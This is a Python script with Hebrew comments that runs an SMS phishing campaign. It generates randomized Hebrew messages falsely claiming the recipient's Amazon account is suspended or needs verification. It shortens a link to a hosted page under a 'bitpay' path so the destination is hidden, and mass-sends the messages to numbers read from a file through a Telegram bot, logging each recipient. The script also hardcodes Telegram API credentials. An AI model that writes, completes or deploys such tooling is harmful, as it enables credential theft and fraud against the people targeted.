import requests
import json
from pathlib import Path
from datetime import datetime
import random
import sys
import asyncio
from telethon import TelegramClient

# ======================================================
# 1) קבע כאן את הקבועים (אין צורך במפתח API)
# ======================================================
# אם ברצונך להשתמש בכתובת בסיסית שונה (למשל amazon_security), שנה את הערך של BASE_LONG_URL
BASE_LONG_URL   = "https://ngx361.inmotionhosting.com/~f702715/bitpay/"
DIDLI_API       = "https://6ejpppqpkh.execute-api.eu-west-1.amazonaws.com/Prod/create"
DIDLI_BASE      = "https://did.li/"

# קובץ שבו שמור המונה הנוכחי (כדי לספור "attempt")
COUNTER_FILE   = Path("counter.txt")
# קובץ לוג שבו מתועד כל מי שכבר קיבל הודעה
SENT_LOG_PATH  = Path("sent.log")


# ======================================================
# 2) פונקציית קיצור URL ל־Did.li (ללא x-api-key)
# ======================================================
def shorten_didli(url: str) -> str:
    """
    שולח POST ל־DIDLI_API עם JSON {"url": ...} ומחזיר
    DIDLI_BASE + code מתוך התשובה.
    אם משהו נכשל – זורק ValueError.
    """
    payload = {
        "url": url if url.startswith(("http://", "https://"))
               else "https://" + url
    }
    headers = {
        "Content-Type": "application/json;charset=UTF-8",
        "Accept":        "application/json, text/plain, */*",
        "User-Agent":    "Mozilla/5.0",
    }
    try:
        r = requests.post(DIDLI_API, json=payload, headers=headers, timeout=10)
        r.raise_for_status()
    except Exception as e:
        raise ValueError(f"✗ שגיאה בבקשה ל־Did.li ({url}): {e}")

    data = r.json()  # לדוגמה: {"code": "KhBgT", "title": "InMotion Hosting"}
    code = data.get("code")
    if not code:
        raise ValueError(f"Did.li unexpected response: {json.dumps(data, ensure_ascii=False)}")

    return DIDLI_BASE + code


# ======================================================
# 3) פונקציות לקריאת ושמירת מונה (counter)
# ======================================================
def load_counter() -> int:
    try:
        return int(COUNTER_FILE.read_text().strip())
    except (FileNotFoundError, ValueError):
        return 0

def save_counter(value: int) -> None:
    COUNTER_FILE.write_text(str(value))


# ======================================================
# 4) פונקציה לרישום מי כבר קיבל הודעה (log)
# ======================================================
def log_sent(num: str) -> None:
    with SENT_LOG_PATH.open("a", encoding="utf-8") as fh:
        fh.write(f"{datetime.now():%Y-%m-%d %H:%M:%S} - Sent to {num}\n")


# ======================================================
# 5) הגדרת תבניות ההודעה
# ======================================================
prefixes = [
    "שים לב", "לתשומת לבך", "הודעה חשובה", "אזהרה", "עדכון אבטחה", "שימו לב"
]

issues = [
    "זוהתה פעילות חשודה בחשבון האמזון שלך",
    "הגישה לחשבון האמזון שלך הוגבלה",
    "החשבון שלך באמזון דורש אימות",
    "המערכת חסמה את חשבון האמזון שלך"
]

instructions = [
    "להמשך השימוש",
    "כדי לשחזר הגישה",
    "לשחרור החסימה",
    "כדי לאמת את זהותך"
]

actions = [
    "יש לאשר את פרטיך",
    "נא לעדכן את פרטיך",
    "נא להשלים אימות",
    "נא לאמת את החשבון"
]


def generate_random_message(long_url: str) -> str:
    """
    יוצר טקסט אזהרה אקראי עם קישור מקוצר.
    הפורמט: {prefix}: {issue}. {instruction}, {action}: {short_url}
    """
    template = (
        f"{random.choice(prefixes)}: {random.choice(issues)}. "
        f"{random.choice(instructions)}, {random.choice(actions)}: {{link}}"
    )

    try:
        short_url = shorten_didli(long_url)
    except Exception as e:
        print(e)
        # אם הקיצור נכשל, נשלח את ה־URL המקורי
        short_url = long_url

    return template.format(link=short_url)


# ======================================================
# 6) פונקציית main לשליחת SMS דרך Telethon
# ======================================================
async def main():
    # קובץ טקסט עם מספר טלפון בכל שורה, בפורמט: +9725XXXXXXXX
    numbers_path = "numbers.txt"
    try:
        numbers = [line.strip() for line in open(numbers_path, encoding="utf-8") if line.strip()]
    except FileNotFoundError:
        print(f"File not found: {numbers_path}")
        sys.exit(1)

    if not numbers:
        print("No phone numbers found.")
        return

    # הגדרות התחברות ל־Telegram (משתמש רגיל, לא בוט)
    api_id   = 3899705
    api_hash = "df88919838678052787622b96a16f276"
    BOT_USERNAME = "testmalna_bot"  # ניתן להוסיף '@' בתחילת השם אם אין

    if not BOT_USERNAME.startswith("@"):
        BOT_USERNAME = "@" + BOT_USERNAME

    client = TelegramClient("my_user_session", api_id, api_hash)
    await client.start()

    sleep_between = 30  # שניות בין כל שליחה

    # נשתמש ב־BASE_LONG_URL כדי להרכיב את ה־long_url עם פרמטרים
    counter = load_counter()  # טוען את המונה הנוכחי (0 אם לא קיים)
    total = len(numbers)

    for idx, phone in enumerate(numbers, start=1):
        # מרכיבים long URL עם attempt=counter
        long_url = f"{BASE_LONG_URL}?user={phone}&attempt={counter}"
        message_text = generate_random_message(long_url)

        try:
            print(f"[{idx}/{total}] ⏳ שולח ל־{phone} → {message_text!r}")
            await client.send_message(BOT_USERNAME, f"/send {phone} {message_text}")
            print(f"[{idx}/{total}] ✔ נשלח בהצלחה ל־{phone}")

            log_sent(phone)         # רושם בלוג את ההצלחה
            counter += 1            # מעדכן את המונה
            save_counter(counter)   # שומר את המונה לקובץ
        except Exception as e:
            print(f"[{idx}/{total}] ✗ שגיאה בשליחה ל־{phone}:", e)

        # אם עדיין יש עוד מספרים, נחכה לפני השליחה הבאה
        if idx < total:
            print(f"⏱ מחכה {sleep_between} שניות לפני ההודעה הבאה…\n")
            await asyncio.sleep(sleep_between)

    await client.disconnect()
    print("המשימה הסתיימה.")


# ======================================================
# 7) הפעלת התוכנית
# ======================================================
if __name__ == "__main__":
    asyncio.run(main())
